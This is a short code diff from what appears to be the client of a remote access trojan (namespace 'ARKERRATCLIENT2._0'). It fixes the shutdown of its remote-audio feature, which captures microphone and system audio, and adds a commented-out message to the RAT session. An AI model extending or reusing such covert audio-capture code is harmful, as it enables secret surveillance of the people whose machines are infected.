@@ -148,25 +148,31 @@ namespace ARKERRATCLIENT2._0
         }
 
         private static bool stopRemoteAudio = false;
-        public static void StopRemoteAudio()
+        public static async void StopRemoteAudio()
         {
-            loopbackCapture.StopRecording();
-            waveInEventInput.StopRecording();
-            stopRemoteAudio = true;
+      
 
-            waveInEventInput = null;
-            loopbackCapture = null;
+            
 
 
             if (loopbackCapture != null)
             {
+                loopbackCapture.StopRecording();
                 loopbackCapture.Dispose();
             }
 
             if (waveInEventInput != null)
             {
+                waveInEventInput.StopRecording();
                 waveInEventInput.Dispose();
             }
+
+            stopRemoteAudio = true;
+
+            waveInEventInput = null;
+            loopbackCapture = null;
+
+            //await RATClientSession.SendData("§RemoteAudioStart§close§RemoteAudioEnd§");
         }
     }
 }
